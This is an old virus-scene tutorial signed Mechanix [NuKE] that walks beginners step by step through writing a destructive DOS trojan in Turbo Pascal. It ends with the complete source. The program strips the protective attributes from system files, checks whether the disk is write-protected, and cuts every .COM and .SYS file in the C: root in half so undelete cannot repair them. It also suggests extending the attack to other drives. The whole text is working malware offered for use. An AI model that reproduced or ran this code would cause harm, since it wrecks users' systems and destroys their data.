Turbo Pascal Programming :

    I have often been asked, how can I make a virus with Turbo Pascal. Well the
 answer is you can't. The reason is that Turbo Pascal doesn't have the ability
 to stay resident and monitor/hook up DOS interrupts needed by a virus for the
 infection of files. Turbo Pascal can make TSRs, but these are mostly one shot
 deals that can execute after a certain time or after a certain number of
 keystrokes. However, Turbo Pascal is an excellent language to program trojans
 with, and can surpass almost everything possible with Basic. It is also
 relatively easy to learn compared to Assembler or even C.
    Now, what I'm going to attempt is explain the steps in creating a simple
 Turbo Pascal trojan. This is for beginners only. I am simply trying to show
 the different procedures and functions that can be used in trojan programming.
 Thus I will detail every step and recopy the complete source at the end of
 this article. By the way, I'm using the Turbo Pascal v5.5 compiler.
 Important: All lines beginning with ">" are part of the program. Just type
 these lines in, but omit the ">". Do not type in the ">".

 Step 1- Initializing the program: Without this you're not going to get very
         far. So just type in the following:

 >        PROGRAM TROJAN;
 >        USES DOS;

         I'm not putting in the CRT unit because we have no need for it here.

 Step 2- Figure out what you're going to do: The hardest part of programming a
         trojan is coming up with a worthwhile concept. After that, programming
         should be a breeze. For this one we will simply go to the root
         directory and destroy the two hidden .SYS files and COMMAND.COM.
 Step 3- Figure out how you're going to do it: Once you have the plan thought
         up, the programming part shouldn't be to hard. Now for our trojan we
         need a way to locate our files. Now since the .SYS files might differ
         from one system to the other, we cannot go with default filenames. So
         we are going to use a recursive procedure similar to the one in my
         bypass trojan v1.0 (if you read that article) to find all .SYS and
         .COM in the root directory of the C: drive. I chose the C: drive for
         obvious reasons, but you can just repeat the process for all logical
         drives A: to E: and more. You also need to define a few variables that
         will be used later on. Type the following in:

 >        VAR
 >        Target  : SEARCHREC;  { Fundamental. This is a internal record that }
 >                              { is necessary for the Findfirst function.    }
 >        T       : FILE;
 >        PROCEDURE KILL (FIND : STRING);
 >        BEGIN

         Now what we want is to get drive C: so type in the following:

 >        Chdir ('C:\');

         Now we have to find our target files. For this we will use the
         internal procedure Findfirst. The command string for Findfirst is:

          FindFirst(Path : string; Attr : Word; var S : SearchRec);

         Where Path is the files we want to find. Path will be called from the
         main program. S is the variable Target defined above and Attr is the
         attributes we are looking for. Here is a list of attributes for the
         Findfirst and other procedures:
             ReadOnly  = $01;
             Hidden    = $02;
             SysFile   = $04;
             VolumeID  = $08;
             Directory = $10;
             Archive   = $20;
             AnyFile   = $3F;

         Since we are looking for all files with all attributes except
         directories, are Attr will be $3F - $10. So type this in:

 >        Findfirst (FIND,($3F - $10),Target);
 >        WHILE DOSERROR = 0 DO
 >        Begin
         If a file is found, Doserror will equal 0. Otherwise we return to the
         main program, our task achieved. Now let's say that our trojan has
         found a file, we must assign it to a variable, the variable T defined
         above. Now the file found by Findfirst has been saved in the Target
         record. To get the full filename, we must enter Target.Name. So type
         in the following:

 >        ASSIGN (T,Target.name);

         Now we must change the files attribute to archive in case it's a
         read-only or system file (the .SYS files). So we use the procedure
         Setfattr. The correct command line is

          SetFAttr(var F; Attr : Word);

         Where F is the T variable and Attr it's new attribute. So type in the
         following:

 >        Setfattr (T,$20);

         This gives the archive attribute to our file. Having bypassed file
         write-protection, we must now check for disk write-protection.
         However, physical disk write-protection is unremovable, so the best we
         can do is check for it, and if found, abort the program or pass to
         another drive. To check for write protect we will create a directory
         on the drive, and check the ioresult. If the directory is successfully
         created, then ioresult will equal 0 and the disk is not
         write-protected, otherwise we abort. It is important to state the
         {$I-} and {$I+} parameters to turn off a possible runtime error. So
         type in the following:
 >        {$I-}
 >        Mkdir ('�');
 >        {$I+}
 >        IF IORESULT = 0 THEN
 >        Begin
 >        Rmdir ('�');

         We use � as this is less obvious in the compiled program. Now that we
         can access are target file properly, we must decide on a way to
         destroy it. Now we could erase it but this can be repaired with
         undelete. So I choose to cut the file in half, thus making it
         unusable. Now we use the truncate command. This command cuts the file
         at the current file position. So we must go halfway into the file
         before truncating it. We use seek. Type in the following:

 >        Reset (T);
 >        Seek (T,Filesize(T) DIV 2);
 >        Truncate (T);
 >        Close (T);
 >        End

         Don't forget to close the file (Close(T)). Now we just add the command
         that happens if the drive is write-protected. Type in the following:

 >        ELSE
 >        Exit;
 >        Findnext (Target);
 >        End;
 >        END;

         The Findnext procedure simply repeats the Findfirst routine until all
         files are found, then Doserror doesn't equal 0 and the program exits.
         We must now type up the main program. The only checking done here is
         to check if drive C: exists, and then we execute procedure KILL for
         .SYS and .COM files. Type in the following:

 >        BEGIN
 >        {$I-}
 >        Chdir ('C:\');
 >        {$I+}
 >        IF IORESULT = 0 THEN
 >        Begin
 >        KILL ('*.COM');
 >        KILL ('*.SYS');
 >        End;
 >        END.

         That assigns *.SYS and *.COM to FIND used in Findfirst.

    Well that ends this program. I made it as detailed as possible for Turbo
 Pascal beginners. More advanced programmers should have no trouble with it. To
 anyone wanting to learn more, I suggest reading through all the procedures
 from the DOS unit, as these are the most helpful in trojan programming. The
 full source follows, and if you want to test it, simply replace C:\ with A:\
 and try it on a system disk in drive A:\ (for example).





    Source:


      PROGRAM TROJAN;
      USES DOS;
      VAR
      Target  : SEARCHREC;
      T       : FILE;

      PROCEDURE KILL (FIND : STRING);
      BEGIN
      Chdir ('C:\');
      Findfirst (FIND,($3F - $10),Target);
      WHILE DOSERROR = 0 DO
      Begin
      ASSIGN (T,Target.name);
      Setfattr (T,$20);
      {$I-}
      Mkdir ('�');
      {$I+}
      IF IORESULT = 0 THEN
      Begin
      Rmdir ('�');
      Reset (T);
      Seek (T,Filesize(T) DIV 2);
      Truncate (T);
      Close (T);
      End
      ELSE
      Exit;
      Findnext (Target);
      End;
      END;
      BEGIN
      {$I-}
      Chdir ('C:\');
      {$I+}
      IF IORESULT = 0 THEN
      Begin
      KILL ('*.COM');
      KILL ('*.SYS');
      End;
      END.

 Mechanix [NuKE]
